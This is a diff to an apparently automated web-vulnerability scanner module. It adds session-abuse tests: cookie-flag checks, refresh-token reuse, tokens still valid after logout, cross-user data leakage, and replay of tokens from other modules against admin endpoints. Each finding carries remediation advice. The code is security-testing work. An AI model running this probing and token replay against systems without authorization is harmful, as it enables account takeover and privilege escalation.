@@ -967,8 +1271,8 @@ class SessionAbuseScanner(ScanModule):
                                                     f"Login endpoint: POST {path}",
                                                 ],
                                                 cvss_score=7.5,
-                                                cwe="CWE-384",
-                                                confidence=85,
+                                                cwe_id="CWE-384",
+                                                confidence_score=85,
                                                 remediation=(
                                                     "Regenerate session ID after successful authentication. "
                                                     "Call req.session.regenerate() (Express), "
@@ -982,7 +1286,7 @@ class SessionAbuseScanner(ScanModule):
                                                 },
                                             ).to_dict())
                             break
-                except Exception:
+                except (aiohttp.ClientError, asyncio.TimeoutError, json.JSONDecodeError):
                     continue
             if login_path:
                 break
@@ -1004,7 +1308,7 @@ class SessionAbuseScanner(ScanModule):
 
         # Query SharedFindingsStore for XSS findings
         store = SharedFindingsStore.get_instance()
-        xss_findings = store.get_findings_by_type(VulnType.XSS)
+        xss_findings = store.get_findings_by_type(StoreVulnType.XSS)
 
         if not xss_findings:
             return findings
@@ -1014,9 +1318,9 @@ class SessionAbuseScanner(ScanModule):
         # Check if we proved role escalation (from Test 2)
         if self._role_escalation_proved:
             findings.append(Finding(
-                type="session_abuse",
+                vuln_type=VulnType.SESSION_HIJACKING,
                 name="XSS to Admin Privilege Escalation Chain",
-                severity="CRITICAL",
+                severity=Severity.CRITICAL,
                 description=(
                     f"Complete attack chain: "
                     f"1) XSS at {xss_url} allows JavaScript execution. "
@@ -1029,7 +1333,7 @@ class SessionAbuseScanner(ScanModule):
                     f"admin compromise."
                 ),
                 host=base_url,
-                matched_at=xss_url,
+                endpoint=xss_url,
                 evidence=[
                     f"XSS confirmed at: {xss_url}",
                     "Token storage: Bearer JWT (accessible via JavaScript)",
@@ -1038,8 +1342,8 @@ class SessionAbuseScanner(ScanModule):
                     "Chain: XSS → Token Theft → Decode → Tamper Role → Admin",
                 ],
                 cvss_score=9.8,
-                cwe="CWE-79",
-                confidence=85,
+                cwe_id="CWE-79",
+                confidence_score=85,
                 remediation=(
                     "1. Fix XSS vulnerabilities (input sanitization, CSP). "
                     "2. Store tokens in HttpOnly cookies instead of localStorage. "
@@ -1070,9 +1374,9 @@ class SessionAbuseScanner(ScanModule):
             )
             if has_replay:
                 findings.append(Finding(
-                    type="session_abuse",
+                    vuln_type=VulnType.SESSION_HIJACKING,
                     name="XSS to Persistent Session Hijack Chain",
-                    severity="HIGH",
+                    severity=Severity.HIGH,
                     description=(
                         f"Attack chain: "
                         f"1) XSS at {xss_url} allows JavaScript execution. "
@@ -1083,7 +1387,7 @@ class SessionAbuseScanner(ScanModule):
                         f"account, surviving even logout."
                     ),
                     host=base_url,
-                    matched_at=xss_url,
+                    endpoint=xss_url,
                     evidence=[
                         f"XSS confirmed at: {xss_url}",
                         "Token storage: Bearer JWT (JS accessible)",
@@ -1091,8 +1395,8 @@ class SessionAbuseScanner(ScanModule):
                         "Chain: XSS → Token Theft → Persistent Replay",
                     ],
                     cvss_score=8.1,
-                    cwe="CWE-79",
-                    confidence=80,
+                    cwe_id="CWE-79",
+                    confidence_score=80,
                     remediation=(
                         "1. Fix XSS vulnerabilities. "
                         "2. Store tokens in HttpOnly cookies. "
@@ -1109,8 +1413,766 @@ class SessionAbuseScanner(ScanModule):
         return findings
 
     # ------------------------------------------------------------------
+    # Test 7: Cookie Security Flags
+    # ------------------------------------------------------------------
+
+    async def _test_cookie_security_flags(
+        self,
+        session: aiohttp.ClientSession,
+        base_url: str,
+        rate_limiter: RateLimiter,
+    ) -> list[dict]:
+        """Test session cookies for security flags (Secure, HttpOnly, SameSite)."""
+        findings: list[dict] = []
+
+        await rate_limiter.acquire()
+        try:
+            async with session.get(f"{base_url}/", ssl=_SSL_CTX) as resp:
+                # Collect Set-Cookie headers
+                set_cookies = resp.headers.getall("Set-Cookie", [])
+        except (aiohttp.ClientError, asyncio.TimeoutError):
+            return findings
+
+        if not set_cookies:
+            return findings
+
+        # Analyze each cookie
+        for cookie_header in set_cookies:
+            cookie_name = cookie_header.split("=")[0].strip()
+
+            # Only check session-related cookies
+            if not any(
+                name.lower() in cookie_name.lower()
+                for name in SESSION_COOKIE_NAMES
+            ):
+                continue
+
+            cookie_lower = cookie_header.lower()
+            issues: list[str] = []
+
+            # Check Secure flag (required for HTTPS)
+            if base_url.startswith("https://") and "secure" not in cookie_lower:
+                issues.append("Missing Secure flag (cookie sent over HTTP)")
+
+            # Check HttpOnly flag (prevents XSS theft)
+            if "httponly" not in cookie_lower:
+                issues.append("Missing HttpOnly flag (vulnerable to XSS theft)")
+
+            # Check SameSite flag (CSRF protection)
+            if "samesite" not in cookie_lower:
+                issues.append("Missing SameSite flag (vulnerable to CSRF)")
+            elif "samesite=none" in cookie_lower:
+                issues.append("SameSite=None allows cross-site requests")
+
+            if issues:
+                # Determine severity based on which flags are missing
+                if "HttpOnly" in str(issues):
+                    severity = "MEDIUM"
+                    cvss = 5.4
+                else:
+                    severity = "LOW"
+                    cvss = 3.7
+
+                findings.append(Finding(
+                    vuln_type=VulnType.SESSION_HIJACKING,
+                    name=f"Insecure Session Cookie: {cookie_name}",
+                    severity=severity,
+                    description=(
+                        f"Session cookie '{cookie_name}' is missing security flags. "
+                        f"Issues: {'; '.join(issues)}. "
+                        f"This increases the risk of session hijacking via XSS, "
+                        f"man-in-the-middle attacks, or CSRF."
+                    ),
+                    host=base_url,
+                    endpoint=base_url,
+                    evidence=[
+                        f"Cookie: {cookie_name}",
+                        f"Set-Cookie header: {cookie_header[:100]}...",
+                        f"Issues: {'; '.join(issues)}",
+                    ],
+                    cvss_score=cvss,
+                    cwe_id="CWE-614" if "Secure" in str(issues) else "CWE-1004",
+                    confidence_score=90,
+                    remediation=(
+                        "Set all session cookies with: "
+                        "Secure (HTTPS only), "
+                        "HttpOnly (no JavaScript access), "
+                        "SameSite=Strict or SameSite=Lax (CSRF protection). "
+                        "Example: Set-Cookie: session=xxx; Secure; HttpOnly; SameSite=Strict"
+                    ),
+                    metadata={
+                        "module": "session_abuse",
+                        "attack_type": "insecure_cookie_flags",
+                        "cookie_name": cookie_name,
+                        "missing_flags": issues,
+                    },
+                ).to_dict())
+
+        return findings
+
+    # ------------------------------------------------------------------
+    # Test 8: Refresh Token Rotation & Reuse
+    # ------------------------------------------------------------------
+
+    async def _test_refresh_token_abuse(
+        self,
+        session: aiohttp.ClientSession,
+        base_url: str,
+        auth_ctx: Any,
+        rate_limiter: RateLimiter,
+    ) -> list[dict]:
+        """Test refresh token rotation and reuse vulnerabilities.
+
+        Tests:
+        1. Refresh token reuse after rotation (should fail)
+        2. Refresh token valid after logout (should fail)
+        3. Refresh token with long expiration (should be shorter than access token)
+        """
+        findings: list[dict] = []
+
+        # Need refresh token from auth context
+        refresh_token = auth_ctx.extra.get("refresh_token")
+        if not refresh_token:
+            logger.debug("[SESSION_ABUSE] No refresh token in auth context — skipping refresh tests")
+            return findings
+
+        # Find working refresh endpoint
+        refresh_endpoint = None
+        refresh_response = None
+        new_access_token = None
+        new_refresh_token = None
+
+        for path in GENERIC_REFRESH_PATHS:
+            url = f"{base_url}{path}"
+            await rate_limiter.acquire()
+
+            # Try different refresh body formats
+            bodies = [
+                {"refresh_token": refresh_token},
+                {"refreshToken": refresh_token},
+                {"refresh": refresh_token},
+                {"grant_type": "refresh_token", "refresh_token": refresh_token},
+            ]
+
+            refresh_endpoint = None
+            refresh_response = None
+
+            for body in bodies:
+                try:
+                    async with session.post(url, json=body, ssl=_SSL_CTX) as resp:
+                        if resp.status == 200:
+                            try:
+                                data = await resp.json()
+                                if isinstance(data, dict):
+                                    # Extract new tokens safely
+                                    new_access_token = (
+                                        data.get("access_token")
+                                        or data.get("accessToken")
+                                        or data.get("token")
+                                    )
+                                    new_refresh_token = (
+                                        data.get("refresh_token")
+                                        or data.get("refreshToken")
+                                    )
+
+                                    if new_access_token:
+                                        refresh_endpoint = path
+                                        refresh_response = data
+                                        break
+                            except (json.JSONDecodeError, aiohttp.ContentTypeError):
+                                continue
+                except (aiohttp.ClientError, asyncio.TimeoutError):
+                    continue
+
+            if refresh_endpoint:
+                break
+
+        if not refresh_endpoint:
+            logger.debug("[SESSION_ABUSE] No refresh endpoint found")
+            return findings
+
+        logger.info(f"[SESSION_ABUSE] Refresh endpoint found: {refresh_endpoint}")
+
+
+        # Test 8a: Refresh Token Reuse After Rotation
+        # If server issued a new refresh token, the old one should be invalidated
+        if new_refresh_token and new_refresh_token != refresh_token:
+            await rate_limiter.acquire()
+            try:
+                # Try using OLD refresh token again
+                async with session.post(
+                    f"{base_url}{refresh_endpoint}",
+                    json={"refresh_token": refresh_token},
+                    ssl=_SSL_CTX,
+                ) as resp:
+                    if resp.status == 200:
+                        try:
+                            reuse_data = await resp.json()
+                            if isinstance(reuse_data, dict) and (reuse_data.get("access_token") or reuse_data.get("token")):
+                                findings.append(Finding(
+                                    vuln_type=VulnType.SESSION_HIJACKING,
+                                    name="Refresh Token Reuse After Rotation",
+                                    severity=Severity.HIGH,
+                                    description=(
+                                        "Old refresh tokens remain valid after rotation. "
+                                        "When a refresh token is used to obtain new tokens, "
+                                        "the old refresh token should be immediately invalidated. "
+                                        "An attacker who steals a refresh token can maintain "
+                                        "persistent access even after the legitimate user refreshes."
+                                    ),
+                                    host=base_url,
+                                    endpoint=f"{base_url}{refresh_endpoint}",
+                                    evidence=[
+                                        f"Refresh endpoint: POST {refresh_endpoint}",
+                                        "Original refresh token used → new tokens issued",
+                                        "Original refresh token reused → STILL WORKS (vulnerability)",
+                                        "New refresh token was issued but old one not invalidated",
+                                    ],
+                                    cvss_score=7.5,
+                                    cwe_id="CWE-613",
+                                    confidence_score=90,
+                                    remediation=(
+                                        "Implement refresh token rotation with one-time use. "
+                                        "When a refresh token is used, immediately invalidate it "
+                                        "and issue a new one. Store token hashes server-side "
+                                        "to enforce single-use."
+                                    ),
+                                    metadata={
+                                        "module": "session_abuse",
+                                        "attack_type": "refresh_token_reuse",
+                                        "refresh_endpoint": refresh_endpoint,
+                                    },
+                                ).to_dict())
+                        except (json.JSONDecodeError, aiohttp.ContentTypeError):
+                            pass
+            except (aiohttp.ClientError, asyncio.TimeoutError):
+                pass
+
+        # Test 8b: Refresh Token Valid After Logout
+        logout = self._discovered.get("logout")
+        if logout:
+            logout_path, _ = logout
+            auth_headers = {"Authorization": f"Bearer {new_access_token or auth_ctx.token}"}
+
+            # Call logout
+            await rate_limiter.acquire()
+            try:
+                async with session.post(
+                    f"{base_url}{logout_path}",
+                    headers=auth_headers,
+                    ssl=_SSL_CTX,
+                ) as resp:
+                    logout_status = resp.status
+            except (aiohttp.ClientError, asyncio.TimeoutError):
+                logout_status = 0
+
+            if logout_status in (200, 204, 302):
+                # Try using refresh token after logout
+                await rate_limiter.acquire()
+                try:
+                    async with session.post(
+                        f"{base_url}{refresh_endpoint}",
+                        json={"refresh_token": new_refresh_token or refresh_token},
+                        ssl=_SSL_CTX,
+                    ) as resp:
+                        if resp.status == 200:
+                            try:
+                                data = await resp.json()
+                                if isinstance(data, dict) and (data.get("access_token") or data.get("token")):
+                                    findings.append(Finding(
+                                        vuln_type=VulnType.SESSION_HIJACKING,
+                                        name="Refresh Token Valid After Logout",
+                                        severity=Severity.HIGH,
+                                        description=(
+                                            "Refresh token remains valid after logout. "
+                                            "The logout endpoint should revoke both access "
+                                            "and refresh tokens. An attacker can use a stolen "
+                                            "refresh token to regain access even after the "
+                                            "legitimate user logs out."
+                                        ),
+                                        host=base_url,
+                                        endpoint=f"{base_url}{refresh_endpoint}",
+                                        evidence=[
+                                            f"Logout: POST {logout_path} -> {logout_status}",
+                                            f"Post-logout refresh: POST {refresh_endpoint} -> 200",
+                                            "New access token issued after logout!",
+                                        ],
+                                        cvss_score=7.1,
+                                        cwe_id="CWE-613",
+                                        confidence_score=90,
+                                        remediation=(
+                                            "Revoke all tokens (access + refresh) on logout. "
+                                            "Maintain a server-side denylist keyed by token "
+                                            "family or user session. Check denylist on refresh."
+                                        ),
+                                        metadata={
+                                            "module": "session_abuse",
+                                            "attack_type": "refresh_token_post_logout",
+                                            "logout_path": logout_path,
+                                            "refresh_endpoint": refresh_endpoint,
+                                        },
+                                    ).to_dict())
+                            except (json.JSONDecodeError, aiohttp.ContentTypeError):
+                                pass
+                except (aiohttp.ClientError, asyncio.TimeoutError):
+                    pass
+
+        return findings
+
+    # ------------------------------------------------------------------
+    # Test 9: Concurrent Sessions / Multi-Device Logout
+    # ------------------------------------------------------------------
+
+    async def _test_concurrent_sessions(
+        self,
+        session: aiohttp.ClientSession,
+        base_url: str,
+        auth_ctx: Any,
+        rate_limiter: RateLimiter,
+    ) -> list[dict]:
+        """Test concurrent session handling and forced logout.
+
+        Tests:
+        1. Session listing endpoint exists (security feature)
+        2. Multiple logins invalidate previous sessions
+        3. Session limit enforcement
+        """
+        findings: list[dict] = []
+        auth_headers = {"Authorization": f"Bearer {auth_ctx.token}"}
+
+        # Test 9a: Check for session management endpoint
+        sessions_endpoint = None
+        for path in GENERIC_SESSIONS_PATHS:
+            url = f"{base_url}{path}"
+            await rate_limiter.acquire()
+            try:
+                async with session.get(url, headers=auth_headers, ssl=_SSL_CTX) as resp:
+                    if resp.status == 200:
+                        ct = resp.headers.get("content-type", "")
+                        if "json" in ct:
+                            sessions_endpoint = path
+                            break
+            except (aiohttp.ClientError, asyncio.TimeoutError):
+                continue
+
+        # Test 9b: Login from "new device" and check if old token still works
+        # Simulate a new login and verify old session is NOT invalidated
+        # (which would be a security issue for high-security apps)
+
+        login_path = None
+        new_token = None
+
+        # Need credentials to test new login
+        email = auth_ctx.email
+        password = auth_ctx.extra.get("password")
+
+        if email and password:
+            for path in GENERIC_LOGIN_PATHS:
+                url = f"{base_url}{path}"
+                bodies = [
+                    {"email": email, "password": password},
+                    {"username": email, "password": password},
+                ]
+
+                for body in bodies:
+                    await rate_limiter.acquire()
+                    try:
+                        # Use fresh session to simulate new device
+                        async with aiohttp.ClientSession(
+                            timeout=aiohttp.ClientTimeout(total=10),
+                            cookie_jar=aiohttp.DummyCookieJar(),
+                        ) as new_device:
+                            async with new_device.post(url, json=body, ssl=_SSL_CTX) as resp:
+                                if resp.status == 200:
+                                    try:
+                                        data = await resp.json()
+                                        if isinstance(data, dict):
+                                            new_token = (
+                                                data.get("authentication", {}).get("token")
+                                                or data.get("token")
+                                                or data.get("access_token")
+                                                or data.get("accessToken")
+                                            )
+                                            if new_token:
+                                                login_path = path
+                                                break
+                                    except (json.JSONDecodeError, aiohttp.ContentTypeError):
+                                        continue
+
+                    except (aiohttp.ClientError, asyncio.TimeoutError):
+                        continue
+
+                if login_path:
+                    break
+
+            if new_token and new_token != auth_ctx.token:
+                # Got a new token from "second device" — check if old token still works
+                whoami = self._discovered.get("whoami")
+                if whoami:
+                    whoami_path, _ = whoami
+                    old_headers = {"Authorization": f"Bearer {auth_ctx.token}"}
+
+                    await rate_limiter.acquire()
+                    try:
+                        async with session.get(
+                            f"{base_url}{whoami_path}",
+                            headers=old_headers,
+                            ssl=_SSL_CTX,
+                        ) as resp:
+                            if resp.status == 200:
+                                # Old token still works after new login
+                                # This is expected for most apps, but worth noting
+                                # for security-sensitive applications
+                                if not sessions_endpoint:
+                                    findings.append(Finding(
+                                        vuln_type=VulnType.SESSION_HIJACKING,
+                                        name="No Session Management — Multiple Concurrent Sessions Allowed",
+                                        severity=Severity.LOW,
+                                        description=(
+                                            "Multiple concurrent sessions are allowed without "
+                                            "any session management interface. Users cannot see "
+                                            "or revoke active sessions on other devices. For "
+                                            "security-sensitive applications (banking, healthcare), "
+                                            "session listing and forced logout is recommended."
+                                        ),
+                                        host=base_url,
+                                        endpoint=base_url,
+                                        evidence=[
+                                            f"Login from 'new device': POST {login_path} -> new token",
+                                            f"Old token check: GET {whoami_path} -> 200 (still valid)",
+                                            "No session listing endpoint found",
+                                            "Users cannot view or revoke other sessions",
+                                        ],
+                                        cvss_score=3.7,
+                                        cwe_id="CWE-613",
+                                        confidence_score=75,
+                                        remediation=(
+                                            "Implement session management: "
+                                            "1. Add endpoint to list active sessions "
+                                            "2. Allow users to revoke specific sessions "
+                                            "3. Consider single-session enforcement for sensitive apps "
+                                            "4. Show session info (device, location, last active)"
+                                        ),
+                                        metadata={
+                                            "module": "session_abuse",
+                                            "attack_type": "no_session_management",
+                                            "login_path": login_path,
+                                        },
+                                    ).to_dict())
+                            elif resp.status in (401, 403):
+                                # Old token invalidated after new login — this is SECURE
+                                logger.info(
+                                    "[SESSION_ABUSE] Good: New login invalidated old session"
+                                )
+                    except (aiohttp.ClientError, asyncio.TimeoutError):
+                        pass
+
+        return findings
+
+    # ------------------------------------------------------------------
+    # Test 10: Long-Lived Token Detection
+    # ------------------------------------------------------------------
+
+    def _test_long_lived_token(self, token: str, base_url: str) -> list[dict]:
+        """Check if JWT has excessive expiration time or no expiration."""
+        findings: list[dict] = []
+
+        parsed = JWTToken.parse(token)
+        if not parsed:
+            return findings
+
+        exp = parsed.payload.get("exp")
+        iat = parsed.payload.get("iat")
+
+        now = time.time()
+
+        if not exp:
+            # No expiration claim — token never expires!
+            findings.append(Finding(
+                vuln_type=VulnType.JWT_VULNERABILITY,
+                name="JWT Token Has No Expiration",
+                severity=Severity.MEDIUM,
+                description=(
+                    "JWT token lacks an 'exp' (expiration) claim, meaning it never "
+                    "expires. If this token is stolen, an attacker has permanent access "
+                    "until the signing key is rotated or the user is deleted."
+                ),
+                host=base_url,
+                endpoint=base_url,
+                evidence=[
+                    "JWT payload lacks 'exp' claim",
+                    f"Token prefix: {token[:50]}...",
+                    "Token validity: NEVER EXPIRES",
+                ],
+                cvss_score=5.4,
+                cwe_id="CWE-613",
+                confidence_score=95,
+                remediation=(
+                    "Add 'exp' claim to all JWT tokens. Use short expiration for "
+                    "access tokens (5-15 minutes) and longer for refresh tokens "
+                    "(hours to days). Never issue tokens without expiration."
+                ),
+                metadata={
+                    "module": "session_abuse",
+                    "attack_type": "no_token_expiration",
+                    "jwt_claims": list(parsed.payload.keys()),
+                },
+            ).to_dict())
+        else:
+            remaining = exp - now
+            lifetime = exp - iat if iat else remaining
+
+            # Check for excessively long-lived tokens
+            # Access tokens > 1 hour is concerning, > 24 hours is definitely wrong
+            if lifetime > 86400:  # > 24 hours
+                days = int(lifetime / 86400)
+                findings.append(Finding(
+                    vuln_type=VulnType.SESSION_HIJACKING,
+                    name="JWT Access Token Has Excessive Lifetime",
+                    severity=Severity.MEDIUM,
+                    description=(
+                        f"JWT access token has a lifetime of {days}+ days. "
+                        f"Long-lived access tokens increase the window of opportunity "
+                        f"for token theft and replay attacks. If a token is stolen, "
+                        f"the attacker has extended access to the account."
+                    ),
+                    host=base_url,
+                    endpoint=base_url,
+                    evidence=[
+                        f"Token lifetime: {days} days ({int(lifetime)} seconds)",
+                        f"Issued at (iat): {iat}" if iat else "No 'iat' claim",
+                        f"Expires at (exp): {exp}",
+                        f"Remaining validity: {int(remaining)} seconds",
+                    ],
+                    cvss_score=4.3,
+                    cwe_id="CWE-613",
+                    confidence_score=90,
+                    remediation=(
+                        "Use short-lived access tokens (5-15 minutes). "
+                        "Implement refresh token rotation for longer sessions. "
+                        "Consider sliding expiration for active users."
+                    ),
+                    metadata={
+                        "module": "session_abuse",
+                        "attack_type": "long_lived_token",
+                        "token_lifetime_seconds": int(lifetime),
+                        "token_lifetime_days": days,
+                    },
+                ).to_dict())
+            elif lifetime > 3600:  # > 1 hour
+                hours = int(lifetime / 3600)
+                if hours >= 4:  # Only report if >= 4 hours (some apps use 1-2h legitimately)
+                    findings.append(Finding(
+                        vuln_type=VulnType.SESSION_HIJACKING,
+                        name="JWT Access Token Has Long Lifetime",
+                        severity=Severity.LOW,
+                        description=(
+                            f"JWT access token has a lifetime of {hours} hours. "
+                            f"While not critical, shorter token lifetimes reduce "
+                            f"the impact window of token theft."
+                        ),
+                        host=base_url,
+                        endpoint=base_url,
+                        evidence=[
+                            f"Token lifetime: {hours} hours",
+                            f"Remaining validity: {int(remaining/3600)} hours",
+                        ],
+                        cvss_score=2.7,
+                        cwe_id="CWE-613",
+                        confidence_score=80,
+                        remediation=(
+                            "Consider using shorter access token lifetimes (5-30 minutes) "
+                            "with refresh token rotation for better security."
+                        ),
+                        metadata={
+                            "module": "session_abuse",
+                            "attack_type": "moderate_token_lifetime",
+                            "token_lifetime_hours": hours,
+                        },
+                    ).to_dict())
+
+        return findings
+
+    # ------------------------------------------------------------------
+    # Test 11: Cross-Session Token Confusion (Multi-User)
+    # ------------------------------------------------------------------
+
+    async def _test_cross_session_confusion(
+        self,
+        session: aiohttp.ClientSession,
+        base_url: str,
+        rate_limiter: RateLimiter,
+    ) -> list[dict]:
+        """Test for cross-session token confusion and session mix-up.
+
+        With multiple authenticated users, we can test:
+        1. Can User A's token access User B's data?
+        2. Are user-specific endpoints properly isolated?
+        3. Session/token confusion leading to data leakage
+
+        This is only possible with multi-user mode (user_personas).
+        """
+        findings: list[dict] = []
+
+        if not self._user_personas or not self._user_personas.has_multiple_users:
+            return findings
+
+        pairs = self._user_personas.get_cross_user_pairs()
+        if not pairs:
+            return findings
+
+        logger.info(f"[SESSION_ABUSE] Testing cross-session confusion with {len(pairs)} user pairs")
+
+        # User-specific endpoints to test
+        user_endpoints = [
+            "/api/me", "/api/user", "/api/profile", "/api/account",
+            "/rest/user/whoami", "/api/v1/me", "/me", "/userinfo",
+        ]
+
+        for attacker, victim in pairs[:3]:  # Limit to 3 pairs
+            attacker_headers = attacker.auth_headers
+            victim_headers = victim.auth_headers
+
+            for path in user_endpoints:
+                url = f"{base_url}{path}"
+
+                try:
+                    # First, get victim's data with victim's token
+                    await rate_limiter.acquire()
+                    async with session.get(url, headers=victim_headers, ssl=_SSL_CTX) as victim_resp:
+                        if victim_resp.status != 200:
+                            continue
+                        victim_data = await victim_resp.text()
+
+                    # Now try to access the same endpoint with attacker's token
+                    await rate_limiter.acquire()
+                    async with session.get(url, headers=attacker_headers, ssl=_SSL_CTX) as attacker_resp:
+                        if attacker_resp.status != 200:
+                            continue
+                        attacker_data = await attacker_resp.text()
+
+                    # Check if attacker got victim's data (session confusion)
+                    if victim.email and victim.email in attacker_data:
+                        findings.append(Finding(
+                            vuln_type=VulnType.SESSION_HIJACKING,
+                            name="Cross-Session Data Leakage",
+                            severity=Severity.CRITICAL,
+                            description=(
+                                f"User '{attacker.email}' received data belonging to "
+                                f"user '{victim.email}' from {path}. This indicates "
+                                f"session confusion or improper user isolation."
+                            ),
+                            host=base_url,
+                            endpoint=url,
+                            evidence=[
+                                f"Attacker: {attacker.email} (token from {attacker.persona_name})",
+                                f"Victim data found: {victim.email}",
+                                f"Endpoint: {path}",
+                            ],
+                            cvss_score=9.1,
+                            cwe_id="CWE-639",
+                            confidence_score=95.0,
+                            remediation=(
+                                "Ensure user data is strictly bound to the authenticated user's "
+                                "session. Never cache user data without proper user-scoped keys."
+                            ),
+                            metadata={
+                                "module": "session_abuse",
+                                "attack_type": "cross_session_confusion",
+                                "attacker_user": attacker.email,
+                                "victim_user": victim.email,
+                                "can_chain": True,
+                            },
+                        ).to_dict())
+                        return findings  # Critical finding, stop testing
+
+                    # Check if attacker got different user's ID in response
+                    if victim.user_id and victim.user_id in attacker_data:
+                        findings.append(Finding(
+                            vuln_type=VulnType.SESSION_HIJACKING,
+                            name="Cross-Session User ID Leakage",
+                            severity=Severity.HIGH,
+                            description=(
+                                f"Attacker's request returned victim's user ID ({victim.user_id}). "
+                                f"This may indicate improper session handling or caching issues."
+                            ),
+                            host=base_url,
+                            endpoint=url,
+                            evidence=[
+                                f"Attacker: {attacker.email}",
+                                f"Victim user_id in response: {victim.user_id}",
+                            ],
+                            cvss_score=7.5,
+                            cwe_id="CWE-639",
+                            confidence_score=85.0,
+                            remediation="Review session management and user data isolation.",
+                            metadata={
+                                "module": "session_abuse",
+                                "attack_type": "cross_session_id_leak",
+                                "can_chain": True,
+                            },
+                        ).to_dict())
+
+                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+                    logger.debug(f"[SESSION_ABUSE] Cross-session test failed for {path}: {e}")
+
+        return findings
+
+    # ------------------------------------------------------------------
     # Utility methods
     # ------------------------------------------------------------------
+
+    def _extract_user_id(self, data: dict[str, Any]) -> Optional[str]:
+        """Extract user identifier from API response for identity comparison."""
+        if not data:
+            return None
+
+        # Common user ID field names (in priority order)
+        id_fields = [
+            "id", "user_id", "userId", "uid", "sub",
+            "email", "username", "login", "name",
+        ]
+
+        # Try top-level fields
+        for field in id_fields:
+            if field in data and data[field]:
+                return str(data[field])
+
+        # Try nested user object
+        user_obj = data.get("user") or data.get("data") or data.get("profile")
+        if isinstance(user_obj, dict):
+            for field in id_fields:
+                if field in user_obj and user_obj[field]:
+                    return str(user_obj[field])
+
+        return None
+
+    def _get_jwt_exp_info(self, token: str) -> str:
+        """Extract and format JWT expiration info."""
+        try:
+            parsed = JWTToken.parse(token)
+            if not parsed:
+                return "unparseable"
+
+            exp = parsed.payload.get("exp")
+            if not exp:
+                return "no exp claim (never expires!)"
+
+            now = time.time()
+            remaining = exp - now
+
+            if remaining <= 0:
+                return "EXPIRED"
+            elif remaining < 300:  # 5 minutes
+                return f"expires in {int(remaining)}s (very short)"
+            elif remaining < 3600:  # 1 hour
+                return f"expires in {int(remaining/60)}m"
+            elif remaining < 86400:  # 1 day
+                return f"expires in {int(remaining/3600)}h"
+            else:
+                return f"expires in {int(remaining/86400)}d (long-lived)"
+        except Exception:
+            return "parse error"
 
     def _find_role_claims(
         self, payload: dict[str, Any],
@@ -1132,6 +2194,99 @@ class SessionAbuseScanner(ScanModule):
                         found.append((f"{nested_key}.{key}", nested[key]))
 
         return found
+
+
+    # ------------------------------------------------------------------
+    # THEME-4: Test with Cross-Module Extracted Tokens
+    # ------------------------------------------------------------------
+
+    async def _test_cross_module_tokens(
+        self,
+        session: aiohttp.ClientSession,
+        base_url: str,
+        tokens: list[dict],
+        rate_limiter: RateLimiter,
+    ) -> list[dict]:
+        """
+        THEME-4: Test tokens extracted by other modules (SQLi, etc.).
+
+        When SQLi extracts a JWT via auth bypass, we should test:
+        1. Is the token still valid?
+        2. What role does it grant?
+        3. Can we access privileged endpoints?
+        """
+        findings: list[dict] = []
+
+        if not tokens:
+            return findings
+
+        logger.info(f"[SESSION_ABUSE/THEME-4] Testing {len(tokens)} cross-module extracted tokens")
+
+        # Privileged endpoints to test
+        priv_endpoints = [
+            "/api/admin", "/api/users", "/admin/config",
+            "/rest/admin/application-configuration",
+            "/api/v1/admin", "/management/users",
+            "/api/me", "/rest/user/whoami",
+        ]
+
+        for token_info in tokens[:5]:  # Limit to 5 tokens
+            token = token_info.get("token", "")
+            source = token_info.get("_source_module", "unknown")
+
+            if not token or len(token) < 10:
+                continue
+
+            headers = {"Authorization": f"Bearer {token}"}
+
+            for path in priv_endpoints[:5]:
+                url = f"{base_url}{path}"
+
+                try:
+                    await rate_limiter.acquire()
+                    async with session.get(url, headers=headers, ssl=self._ssl_ctx) as resp:
+                        if resp.status == 200:
+                            body = await resp.text()
+
+                            # Check if we got actual data (not error page)
+                            if len(body) > 50 and "error" not in body.lower()[:100]:
+                                findings.append(Finding(
+                                    vuln_type=VulnType.SESSION_HIJACKING,
+                                    name=f"Cross-Module Token Valid - Extracted via {source}",
+                                    severity=Severity.CRITICAL,
+                                    description=(
+                                        f"Token extracted by {source} module grants access to {path}. "
+                                        f"This confirms the SQLi/XXE attack chain to session abuse."
+                                    ),
+                                    host=base_url,
+                                    endpoint=url,
+                                    evidence=[
+                                        f"Token source: {source}",
+                                        f"Endpoint accessed: {path}",
+                                        f"Response status: {resp.status}",
+                                        f"Response preview: {body[:200]}...",
+                                        "Chain: SQLi/XXE → Token Extraction → Session Abuse",
+                                    ],
+                                    cwe_id="CWE-384",
+                                    cvss_score=9.1,
+                                    metadata={
+                                        "chain_type": "cross_module_token_abuse",
+                                        "source_module": source,
+                                        "token_preview": token[:50] + "..." if len(token) > 50 else token,
+                                    },
+                                    confidence_score=90.0,
+                                ).to_dict())
+
+                                logger.info(
+                                    f"[SESSION_ABUSE/THEME-4] Cross-module token from {source} "
+                                    f"grants access to {path}"
+                                )
+                                break  # Found access, move to next token
+
+                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+                    logger.debug(f"[SESSION_ABUSE/THEME-4] Token test failed: {e}")
+
+        return findings
 
 
 # ---------------------------------------------------------------------------
